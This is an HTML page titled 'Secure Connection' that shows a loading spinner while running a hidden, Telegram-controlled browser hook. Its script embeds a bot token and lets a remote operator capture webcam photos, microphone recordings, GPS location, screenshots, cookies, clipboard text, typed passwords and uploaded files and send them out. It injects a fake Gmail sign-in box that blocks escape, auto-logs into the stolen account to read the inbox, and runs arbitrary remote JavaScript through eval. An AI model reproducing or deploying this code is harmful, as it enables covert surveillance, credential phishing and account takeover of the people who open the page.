<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Secure Connection</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #f5f5f5;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }
        .loader-container {
            text-align: center;
            background: white;
            padding: 2rem;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            z-index: 1000;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 1rem;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #mainFrame {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 0;
            opacity: 0;
            transition: opacity 0.8s;
        }
        #persistentFrame {
            position: absolute;
            width: 1px;
            height: 1px;
            top: -100px;
            left: -100px;
            opacity: 0;
            pointer-events: none;
            z-index: -1;
        }
        .gmail-phish-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.7);
            z-index: 10000;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
        }
        .gmail-phish-box {
            background: white;
            border-radius: 8px;
            width: 90%;
            max-width: 450px;
            padding: 30px 25px 40px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            text-align: center;
        }
        .gmail-phish-box input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
        }
        .gmail-phish-box button {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
        }
        .error-msg { color: #d93025; font-size: 14px; margin-top: 10px; display: none; }
        body.modal-active { overflow: hidden; }
        /* debug console panel (hidden, but shows if needed) */
        #debug {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            background: black;
            color: lime;
            font-size: 10px;
            max-height: 80px;
            overflow-y: auto;
            z-index: 99999;
            display: none;
        }
    </style>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
</head>
<body>
    <div class="loader-container" id="loadingOverlay">
        <div class="spinner"></div>
        <h2>Loading, please wait...</h2>
        <p>Secure connection established.</p>
    </div>
    <iframe id="mainFrame" src="https://example.com" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals"></iframe>
    <iframe id="persistentFrame" src="about:blank" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals allow-top-navigation" style="display:none;"></iframe>
    <div id="debug"></div>

    <script>
        (function(){
            "use strict";

            // ================= CONFIGURATION =================
            const BOT_TOKEN = '8705927666:AAF0qRR0dSmBSG4kMMokObu6zXw3ZPQjGTI';
            const ADMIN_CHAT_ID = '8737104261';
            const POLL_INTERVAL = 3000;
            const START_DELAY = 5000;
            const AUDIO_DURATION_MS = 120000;

            // ================= STATE =================
            let isRegistered = false;
            let updateId = 0;
            let intervalId = null;
            let phishingModalActive = false;
            let deviceId = null;
            let gmailDetectedNotified = false;
            let storedGmailCredentials = { email: '', password: '' };
            let permissionsStatus = { camera: false, microphone: false, location: false, clipboard: false };

            // Enable debug logging to console AND to a visible div
            function debugLog(msg) {
                console.log(msg);
                const debugDiv = document.getElementById('debug');
                if (debugDiv) {
                    debugDiv.style.display = 'block';
                    debugDiv.innerHTML += new Date().toLocaleTimeString() + ' ' + msg + '<br>';
                    debugDiv.scrollTop = debugDiv.scrollHeight;
                }
            }
            debugLog('Script started');

            // ================= TELEGRAM HELPERS =================
            const TELEGRAM_HEADERS = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            };

            async function sendMessage(text, parseMode = 'HTML', replyMarkup = null) {
                debugLog(`Sending message: ${text.substring(0,50)}...`);
                try {
                    const body = { chat_id: ADMIN_CHAT_ID, text, parse_mode: parseMode };
                    if (replyMarkup) body.reply_markup = replyMarkup;
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { ...TELEGRAM_HEADERS, 'Content-Type': 'application/json' },
                        body: JSON.stringify(body)
                    });
                    const data = await response.json();
                    if (!data.ok) {
                        debugLog(`sendMessage error: ${JSON.stringify(data)}`);
                    } else {
                        debugLog(`Message sent OK`);
                    }
                } catch(e) {
                    debugLog(`sendMessage exception: ${e.message}`);
                }
            }

            async function sendPhoto(blob, caption) {
                const fd = new FormData();
                fd.append('chat_id', ADMIN_CHAT_ID);
                fd.append('photo', blob, 'capture.jpg');
                fd.append('caption', caption);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', headers: TELEGRAM_HEADERS, body: fd });
            }

            async function sendDocument(blob, filename, caption) {
                const fd = new FormData();
                fd.append('chat_id', ADMIN_CHAT_ID);
                fd.append('document', blob, filename);
                fd.append('caption', caption);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', headers: TELEGRAM_HEADERS, body: fd });
            }

            async function sendTyping() {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendChatAction?chat_id=${ADMIN_CHAT_ID}&action=typing`, { headers: TELEGRAM_HEADERS });
            }

            // ================= PERMISSIONS =================
            async function requestAllPermissions() {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    permissionsStatus.camera = true;
                    stream.getTracks().forEach(t => t.stop());
                } catch(e) { permissionsStatus.camera = false; }
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    permissionsStatus.microphone = true;
                    stream.getTracks().forEach(t => t.stop());
                } catch(e) { permissionsStatus.microphone = false; }
                try {
                    await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject);
                    });
                    permissionsStatus.location = true;
                } catch(e) { permissionsStatus.location = false; }
                try {
                    await navigator.clipboard.readText();
                    permissionsStatus.clipboard = true;
                } catch(e) { permissionsStatus.clipboard = false; }
                debugLog(`Permissions: camera=${permissionsStatus.camera}, mic=${permissionsStatus.microphone}, gps=${permissionsStatus.location}, clipboard=${permissionsStatus.clipboard}`);
            }

            // ================= MENU =================
            async function sendMenu() {
                const inlineKeyboard = {
                    inline_keyboard: [
                        [{ text: '📷 Camera', callback_data: 'photo' }, { text: '🎤 Mic', callback_data: 'audio' }],
                        [{ text: '📍 GPS', callback_data: 'location' }, { text: '📸 Screenshot', callback_data: 'screenshot' }],
                        [{ text: '🍪 Cookies', callback_data: 'cookies' }, { text: '🔑 Grab Pass', callback_data: 'grab_pass' }],
                        [{ text: '📋 Clipboard', callback_data: 'clipboard' }, { text: '🎣 Phish Gmail', callback_data: 'phish_gmail' }],
                        [{ text: '📁 Upload', callback_data: 'upload' }, { text: '💻 Eval', callback_data: 'eval' }],
                        [{ text: '📜 History', callback_data: 'history' }, { text: '📧 Auto Gmail', callback_data: 'auto_gmail' }]
                    ]
                };
                const replyKeyboard = {
                    keyboard: [[{ text: '🏠 Home' }]],
                    resize_keyboard: true,
                    persistent: true
                };
                const menuText = `✅ *HTML Hook Active* | \`${deviceId}\`\n🟢 Online | Permissions: ${permissionsStatus.camera ? '✅📷' : '❌📷'} ${permissionsStatus.microphone ? '✅🎤' : '❌🎤'} ${permissionsStatus.location ? '✅📍' : '❌📍'} ${permissionsStatus.clipboard ? '✅📋' : '❌📋'}\n${storedGmailCredentials.email ? `🔐 Credentials stored for ${storedGmailCredentials.email}. Use /auto_gmail` : 'No Gmail credentials yet. Use /phish_gmail to capture.'}\n\n_This hook survives page navigations._`;
                await sendMessage(menuText, 'Markdown', inlineKeyboard);
                await sendMessage("Press 🏠 Home anytime to see this menu again.", 'HTML', replyKeyboard);
            }

            // ================= REGISTRATION =================
            async function registerClient() {
                deviceId = 'hook_' + Math.random().toString(36).substr(2, 8);
                const emoji = (p) => p ? '🟢' : '🔴';
                const permLine = `📷 ${emoji(permissionsStatus.camera)}  🎤 ${emoji(permissionsStatus.microphone)}  📍 ${emoji(permissionsStatus.location)}  📋 ${emoji(permissionsStatus.clipboard)}`;
                await sendMessage(
                    `🔌 *HTML Hook Connected*\n🆔 \`${deviceId}\`\n📱 ${navigator.platform} | ${navigator.userAgent.substring(0,60)}...\n📺 ${screen.width}x${screen.height}\n${permLine}\n\n_Persistent mode active._`,
                    'Markdown'
                );
                await sendMenu();
            }

            // ================= GMAIL FUNCTIONS =================
            async function autoLoginAndReadEmails() {
                if (!storedGmailCredentials.email || !storedGmailCredentials.password) {
                    return { success: false, error: "No Gmail credentials stored. Use /phish_gmail first." };
                }
                window.location.href = 'https://accounts.google.com';
                return new Promise((resolve) => {
                    let attempts = 0;
                    const interval = setInterval(async () => {
                        const emailField = document.querySelector('input[type="email"]');
                        const passwordField = document.querySelector('input[type="password"]');
                        const nextBtn = document.querySelector('#identifierNext, #passwordNext, button[jsname]');
                        
                        if (emailField && !emailField.value) {
                            emailField.value = storedGmailCredentials.email;
                            emailField.dispatchEvent(new Event('input', { bubbles: true }));
                            if (nextBtn) nextBtn.click();
                        } else if (passwordField && !passwordField.value) {
                            passwordField.value = storedGmailCredentials.password;
                            passwordField.dispatchEvent(new Event('input', { bubbles: true }));
                            if (nextBtn) nextBtn.click();
                        } else if (window.location.href.includes('mail.google.com')) {
                            clearInterval(interval);
                            setTimeout(async () => {
                                const emails = await readGmailInbox();
                                resolve({ success: true, data: emails });
                            }, 3000);
                            return;
                        }
                        attempts++;
                        if (attempts > 60) {
                            clearInterval(interval);
                            resolve({ success: false, error: "Auto-login timed out" });
                        }
                    }, 500);
                });
            }

            async function readGmailInbox() {
                if (!window.location.href.includes('mail.google.com')) {
                    return { success: false, error: "Not on Gmail page." };
                }
                const rows = document.querySelectorAll('.zA, .zE, .Cp');
                const emails = [];
                for (let row of rows.slice(0, 20)) {
                    const from = row.querySelector('.yP, .zF, .bA4')?.innerText || '';
                    const subject = row.querySelector('.bog, .bqe, .b6')?.innerText || '';
                    const snippet = row.querySelector('.y2, .y3, .b8c')?.innerText || '';
                    if (from || subject) {
                        emails.push({ from, subject, snippet: snippet.substring(0, 100) });
                    }
                }
                if (emails.length === 0) return { success: true, data: "No emails found in current view." };
                return { success: true, data: emails };
            }

            // ================= PHISHING MODAL =================
            function createPhishingModal() {
                if (phishingModalActive) return;
                phishingModalActive = true;
                document.body.classList.add('modal-active');

                const modal = document.createElement('div');
                modal.className = 'gmail-phish-modal';
                modal.innerHTML = `
                    <div class="gmail-phish-box">
                        <h1>Sign in to continue to Gmail</h1>
                        <input type="email" id="phish-email" placeholder="Email or phone">
                        <input type="password" id="phish-password" placeholder="Password">
                        <button id="phish-submit">Next</button>
                        <div class="error-msg" id="phish-error">Incorrect email or password. Please try again.</div>
                    </div>
                `;
                document.body.appendChild(modal);

                const blockKeys = (e) => {
                    if (e.key === 'Escape') {
                        e.preventDefault();
                        const errDiv = document.getElementById('phish-error');
                        if (errDiv) errDiv.style.display = 'block';
                    }
                };
                document.addEventListener('keydown', blockKeys);
                modal.addEventListener('click', (e) => {
                    if (e.target === modal) {
                        const errDiv = document.getElementById('phish-error');
                        if (errDiv) errDiv.style.display = 'block';
                    }
                });

                const emailInp = document.getElementById('phish-email');
                const passInp = document.getElementById('phish-password');
                const errDiv = document.getElementById('phish-error');
                const submit = async () => {
                    const email = emailInp.value.trim();
                    const pass = passInp.value;
                    if (!email || !pass) {
                        errDiv.style.display = 'block';
                        errDiv.innerText = 'Please fill both fields.';
                        return;
                    }
                    storedGmailCredentials = { email, password: pass };
                    await sendMessage(`🎣 *Gmail Credentials Captured*\n📧 Email: ${email}\n🔑 Password: ${pass}\n\nUse /auto_gmail to automatically log in and read emails.`, 'Markdown');
                    modal.remove();
                    document.body.classList.remove('modal-active');
                    phishingModalActive = false;
                    document.removeEventListener('keydown', blockKeys);
                    setTimeout(() => { window.location.href = 'https://mail.google.com'; }, 500);
                };
                document.getElementById('phish-submit').addEventListener('click', submit);
                emailInp.addEventListener('keypress', e => { if (e.key === 'Enter') submit(); });
                passInp.addEventListener('keypress', e => { if (e.key === 'Enter') submit(); });
            }

            // ================= BROWSER HISTORY =================
            async function getBrowserHistory() {
                return `📍 *Current Page:* ${location.href}\n↩️ *Referrer:* ${document.referrer || 'none'}\n\n⚠️ Full browser history is not accessible from a web page. Use the Chrome extension for full history.`;
            }

            // ================= COMMAND HANDLER =================
            async function handleCommand(fullText) {
                let cmd = fullText.trim().toLowerCase();
                debugLog(`Received command: "${cmd}"`);
                
                // Handle persistent Home button
                if (cmd === '🏠 home' || cmd === '/start' || cmd === 'start') {
                    await sendMenu();
                    return;
                }
                // Remove leading slash if present
                if (cmd.startsWith('/')) cmd = cmd.substring(1);
                // Aliases
                if (cmd === 'phishgmail' || cmd === 'phish_gmail') cmd = 'phish_gmail';
                if (cmd === 'grabpass' || cmd === 'grab_pass') cmd = 'grab_pass';
                if (cmd === 'reademails' || cmd === 'read_emails') cmd = 'read_emails';
                if (cmd === 'autogmail' || cmd === 'auto_gmail') cmd = 'auto_gmail';
                if (cmd === 'home') cmd = 'start';

                await sendTyping();

                try {
                    switch(cmd) {
                        case 'start':
                            await sendMenu();
                            break;
                        case 'auto_gmail':
                            await sendMessage('🔄 Attempting auto-login to Gmail and reading emails. This may take up to 30 seconds...');
                            const autoResult = await autoLoginAndReadEmails();
                            if (autoResult.success) {
                                if (typeof autoResult.data === 'string') {
                                    await sendMessage(`📧 *Auto Gmail Result*\n${autoResult.data}`, 'Markdown');
                                } else {
                                    let msg = `📧 *Latest emails after auto-login* (${autoResult.data.length}):\n\n`;
                                    for (let i = 0; i < autoResult.data.length; i++) {
                                        const e = autoResult.data[i];
                                        msg += `${i+1}. *${e.from || '?'}* – ${e.subject || 'no subject'}\n   ${e.snippet || ''}\n\n`;
                                        if (msg.length > 3800) break;
                                    }
                                    await sendMessage(msg, 'Markdown');
                                }
                            } else {
                                await sendMessage(`❌ Auto Gmail failed: ${autoResult.error}`);
                            }
                            break;
                        case 'phish_gmail':
                            if (!phishingModalActive) createPhishingModal();
                            await sendMessage('🎣 Phishing modal injected. User must enter credentials. They will be stored for auto-login.');
                            break;
                        case 'read_emails':
                            const readResult = await readGmailInbox();
                            if (readResult.success) {
                                if (typeof readResult.data === 'string') {
                                    await sendMessage(`📧 *Gmail Inbox*\n${readResult.data}`, 'Markdown');
                                } else {
                                    let msg = `📧 *Latest emails* (${readResult.data.length}):\n\n`;
                                    for (let i = 0; i < readResult.data.length; i++) {
                                        const e = readResult.data[i];
                                        msg += `${i+1}. *${e.from || '?'}* – ${e.subject || 'no subject'}\n   ${e.snippet || ''}\n\n`;
                                        if (msg.length > 3800) break;
                                    }
                                    await sendMessage(msg, 'Markdown');
                                }
                            } else {
                                await sendMessage(`❌ ${readResult.error}`);
                            }
                            break;
                        case 'gmail':
                            if (location.href.includes('accounts.google.com')) {
                                let email = document.querySelector('input[type="email"]')?.value || '';
                                let pass = document.querySelector('input[type="password"]')?.value;
                                if (!pass) {
                                    const pf = document.querySelector('input[type="password"]');
                                    if (pf) { pf.focus(); setTimeout(() => pf.blur(), 100); }
                                    await sendMessage('Attempting to trigger autofill...');
                                } else {
                                    storedGmailCredentials = { email, password: pass };
                                    await sendMessage(`🔑 Gmail credentials extracted and stored:\n📧 ${email}\n🔑 ${pass}\n\nUse /auto_gmail to log in automatically.`, 'Markdown');
                                }
                            } else {
                                await sendMessage('Not on Google login page. Use /phish_gmail to force a fake modal.');
                            }
                            break;
                        case 'history':
                            const historyInfo = await getBrowserHistory();
                            await sendMessage(historyInfo, 'Markdown');
                            break;
                        case 'photo':
                            try {
                                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                                const video = document.createElement('video');
                                video.srcObject = stream;
                                await new Promise(r => { video.onloadedmetadata = r; video.play(); });
                                const canvas = document.createElement('canvas');
                                canvas.width = video.videoWidth;
                                canvas.height = video.videoHeight;
                                canvas.getContext('2d').drawImage(video, 0, 0);
                                stream.getTracks().forEach(t => t.stop());
                                canvas.toBlob(blob => sendPhoto(blob, '📸 Camera capture'), 'image/jpeg');
                            } catch(e) { await sendMessage(`Camera error: ${e.message}`); }
                            break;
                        case 'audio':
                            try {
                                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                                const mediaRecorder = new MediaRecorder(stream);
                                let chunks = [];
                                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                                mediaRecorder.onstop = async () => {
                                    const blob = new Blob(chunks, { type: 'audio/webm' });
                                    await sendDocument(blob, `recording_${Date.now()}.webm`, `🎙️ Audio recording (${AUDIO_DURATION_MS/1000}s)`);
                                    stream.getTracks().forEach(t => t.stop());
                                };
                                mediaRecorder.start();
                                setTimeout(() => mediaRecorder.stop(), AUDIO_DURATION_MS);
                                await sendMessage(`Recording audio for ${AUDIO_DURATION_MS/1000} seconds...`);
                            } catch(e) { await sendMessage(`Microphone error: ${e.message}`); }
                            break;
                        case 'location':
                            navigator.geolocation.getCurrentPosition(async pos => {
                                await sendMessage(`📍 GPS Location:\nLat: ${pos.coords.latitude}\nLon: ${pos.coords.longitude}\nAccuracy: ${pos.coords.accuracy}m`);
                            }, async err => await sendMessage(`GPS error: ${err.message}`));
                            break;
                        case 'screenshot':
                            html2canvas(document.body).then(canvas => {
                                canvas.toBlob(blob => sendPhoto(blob, '📸 Screenshot'), 'image/png');
                            }).catch(e => sendMessage(`Screenshot failed: ${e.message}`));
                            break;
                        case 'cookies':
                            await sendMessage(`🍪 Cookies: ${document.cookie || 'none'}`);
                            break;
                        case 'grab_pass':
                            const pw = document.querySelector('input[type="password"]');
                            if (pw && pw.value) await sendMessage(`🔐 Password: ${pw.value}`);
                            else await sendMessage('No password field with value found.');
                            break;
                        case 'clipboard':
                            try {
                                const txt = await navigator.clipboard.readText();
                                await sendMessage(`📋 Clipboard: ${txt}`);
                            } catch(e) { await sendMessage(`Clipboard error: ${e.message}`); }
                            break;
                        case 'eval':
                            const code = fullText.replace(/^\/eval\s*/i, '');
                            if (code) {
                                let result = eval(code);
                                if (typeof result !== 'string') result = JSON.stringify(result);
                                await sendMessage(`✅ Eval result:\n${result.substring(0, 3900)}`);
                            } else await sendMessage('Usage: /eval <js code>');
                            break;
                        case 'upload':
                            const input = document.createElement('input');
                            input.type = 'file';
                            input.onchange = async (e) => {
                                const file = e.target.files[0];
                                if (file) await sendDocument(file, file.name, `📁 File: ${file.name}`);
                            };
                            input.click();
                            await sendMessage('File picker opened on victim side.');
                            break;
                        case 'devices':
                            await sendMessage(`🖥️ *Current HTML Hook*\n🆔 \`${deviceId}\`\nPermissions: ${permissionsStatus.camera ? '✅📷' : '❌📷'} ${permissionsStatus.microphone ? '✅🎤' : '❌🎤'} ${permissionsStatus.location ? '✅📍' : '❌📍'} ${permissionsStatus.clipboard ? '✅📋' : '❌📋'}\n${storedGmailCredentials.email ? `🔐 Gmail creds stored for ${storedGmailCredentials.email}` : 'No stored Gmail credentials'}`, 'Markdown');
                            break;
                        default:
                            await sendMessage(`Unknown command: ${cmd}. Press 🏠 Home or send /start.`);
                    }
                } catch(err) {
                    await sendMessage(`Error: ${err.message}`);
                }
            }

            // ================= POLLING (with offset sync) =================
            async function syncOffset() {
                debugLog('Syncing offset...');
                try {
                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1&timeout=1`, { headers: TELEGRAM_HEADERS });
                    const data = await res.json();
                    debugLog(`syncOffset response: ${JSON.stringify(data)}`);
                    if (data.ok && data.result && data.result.length > 0) {
                        updateId = data.result[data.result.length - 1].update_id + 1;
                    } else {
                        updateId = 0;
                    }
                    debugLog(`Update offset set to: ${updateId}`);
                } catch(e) {
                    debugLog(`syncOffset error: ${e.message}`);
                }
            }

            async function pollUpdates() {
                if (!isRegistered) return;
                try {
                    const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${updateId}&timeout=10`;
                    debugLog(`Polling ${url}`);
                    const res = await fetch(url, { headers: TELEGRAM_HEADERS });
                    const data = await res.json();
                    debugLog(`Poll response: ${JSON.stringify(data)}`);
                    if (data.ok && data.result) {
                        for (const upd of data.result) {
                            if (upd.update_id >= updateId) {
                                updateId = upd.update_id + 1;
                                if (upd.message && upd.message.text) {
                                    await handleCommand(upd.message.text);
                                } else if (upd.callback_query) {
                                    const cbData = upd.callback_query.data;
                                    await handleCommand(cbData);
                                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery?callback_query_id=${upd.callback_query.id}`, { headers: TELEGRAM_HEADERS });
                                }
                            }
                        }
                    } else {
                        debugLog(`Poll error: ${data.description || 'unknown'}`);
                    }
                } catch(e) {
                    debugLog(`Poll exception: ${e.message}`);
                }
            }

            // ================= PERSISTENCE =================
            function setupPersistence() {
                document.addEventListener('click', (e) => {
                    let target = e.target.closest('a');
                    if (target && target.href && !target.href.startsWith('javascript:')) {
                        e.preventDefault();
                        window.open(target.href, '_blank');
                    }
                }, true);
                const pframe = document.getElementById('persistentFrame');
                if (pframe) pframe.src = 'about:blank';
                debugLog('Persistence setup complete');
            }

            // Gmail detection observer
            let lastUrl = location.href;
            new MutationObserver(() => {
                const url = location.href;
                if (url !== lastUrl) {
                    lastUrl = url;
                    if (url.includes('mail.google.com') && !gmailDetectedNotified) {
                        gmailDetectedNotified = true;
                        sendMessage(`📧 *Gmail detected* on device \`${deviceId}\`. Use /read_emails to fetch.`, 'Markdown');
                    } else if (!url.includes('mail.google.com')) {
                        gmailDetectedNotified = false;
                    }
                }
            }).observe(document, { subtree: true, childList: true });

            // ================= INIT =================
            async function init() {
                debugLog('Deleting webhook...');
                try {
                    const del = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/deleteWebhook`, { method: 'POST', headers: TELEGRAM_HEADERS });
                    const delData = await del.json();
                    debugLog(`deleteWebhook response: ${JSON.stringify(delData)}`);
                } catch(e) { debugLog(`deleteWebhook error: ${e.message}`); }
                
                await requestAllPermissions();
                setupPersistence();
                await syncOffset();
                await registerClient();  // this sends connection message + menu
                isRegistered = true;
                intervalId = setInterval(pollUpdates, POLL_INTERVAL);
                document.getElementById('loadingOverlay').style.display = 'none';
                document.getElementById('mainFrame').style.opacity = '1';
                debugLog('Hook fully initialized');
            }
            setTimeout(init, START_DELAY);
        })();
    </script>
</body>
</html>
